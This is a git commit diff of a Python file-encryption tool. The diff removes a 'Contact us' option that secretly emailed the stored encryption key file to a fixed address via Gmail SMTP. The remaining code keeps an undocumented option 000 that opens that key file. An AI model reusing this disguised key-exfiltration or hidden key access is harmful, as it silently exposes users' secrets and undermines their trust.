eeb3f738bc2fc3bd52691a439b7dd47c9ed5d240
VBV-121 <vghadiali18@gmail.com>
2020-08-21 21:39:33 +0530

    Initial change

--- File_Encryptor.py
+++ File_Encryptor.py
@@ -4,12 +4,6 @@ import random
 import os,time
 import shutil
 
-import email, smtplib, ssl
-from email import encoders
-from email.mime.base import MIMEBase
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-
 buffer=64*1024
 
 while buffer!=0:
@@ -17,7 +11,7 @@ while buffer!=0:
 	print('''This tool is an Open Source AES Standard encrytion tool, Always make sure to 
 	backup the encryption key if not the files cannot be reverted back''')
 	print('*******************************************************************************')
-	print('1.Encrypt \n2.Decrypt \n3.Folder Encryption \n4.Folder Decryption \n5.Contact us \n6.Exit')
+	print('1.Encrypt \n2.Decrypt \n3.Folder Encryption \n4.Folder Decryption \n5.Exit')
 	ip=int(input(('Enter options: ')))
 	#ip=5
 	if ip==1:
@@ -102,50 +96,9 @@ while buffer!=0:
 		shutil.rmtree('encrypted_folder')
 		print('Decryption Done...')
 
-	elif ip==5:
-		mail_content=input('''\nKindly enter the issue and the our we shall 
-contact u within 2 working days...: ''')
-		mail_id=input('Input ur mail id: ')
-		subject = "A Query from "+mail_id
-		body = "This is an email with attachment sent from Python"
-		sender_email = "xys@gmail.com"
-		receiver_email = "xys@gmail.com"
-		password = 'password'
-
-		message = MIMEMultipart()
-		message["From"] = sender_email
-		message["To"] = receiver_email
-		message["Subject"] = subject
-		message["Bcc"] = receiver_email  
-		message.attach(MIMEText(body, "plain"))
-
-		filename = 'C:\\Intel\\temp_key.txt' 
-
-		with open(filename, "rb") as attachment:
-		    part = MIMEBase("application", "octet-stream")
-		    part.set_payload(attachment.read())
-
-		  
-		encoders.encode_base64(part)
-		part.add_header(
-		    "Content-Disposition",
-		    f"attachment; filename= {filename}",
-		)
-
-		message.attach(part)
-		text = message.as_string()
-
-		context = ssl.create_default_context()
-		with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
-		    server.login(sender_email, password)
-		    server.sendmail(sender_email, receiver_email, text)
-
-		print('Thanks for contacting us\n')
-		time.sleep(3)
-
 	elif ip==000:
 		os.startfile('C:\\Intel\\temp_key.txt')
-	elif ip==6:
+	elif ip==5:
 		print('Thanks for using Fi1e EncRypt0R')
 		time.sleep(5)
 		buffer=0
